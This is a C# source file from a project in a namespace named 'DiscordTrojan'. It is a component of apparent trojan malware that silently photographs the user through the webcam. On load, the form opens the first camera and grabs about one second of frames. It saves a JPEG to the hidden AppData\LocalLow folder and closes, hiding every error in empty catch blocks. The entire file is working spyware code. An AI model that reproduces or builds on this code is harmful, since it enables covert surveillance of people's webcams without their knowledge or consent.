using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Threading;

namespace DiscordTrojan
{
    public partial class Camera : Form
    {
        public Camera()
        {
            InitializeComponent();
        }

        string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string root = @"\AppData\LocalLow";
        VideoCaptureDevice videoCapture;
        FilterInfoCollection filterInfo;



        private void Camera_Load(object sender, EventArgs e)
        {

            StartCamera();
        }

        void StartCamera()
        {
            try
            {
                filterInfo = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                videoCapture = new VideoCaptureDevice(filterInfo[0].MonikerString);
                videoCapture.NewFrame += new NewFrameEventHandler(CameraScreenshot);
                videoCapture.Start();
                Thread.Sleep(1000);
                videoCapture.Stop();
                SaveScreenshot();
                this.Close();
            }
            catch
            {
            }
        }

        private void CameraScreenshot(object sender, NewFrameEventArgs eventArgs)
        {
            pictureBox1.Image = (Bitmap)eventArgs.Frame.Clone();
        }

        void SaveScreenshot()
        {
            try
            {

                var bitmap = new Bitmap(pictureBox1.Width, pictureBox1.Height);
                pictureBox1.DrawToBitmap(bitmap, pictureBox1.ClientRectangle);
                System.Drawing.Imaging.ImageFormat imageFormat = null;
                imageFormat = System.Drawing.Imaging.ImageFormat.Jpeg;
                bitmap.Save(userPath + root + "\\Capture1.jpg", imageFormat);

            }
            catch
            {
            
            }
        }


        private void Camera_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                videoCapture.Stop();
            }
            catch
            {
            
            }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }
    }
}
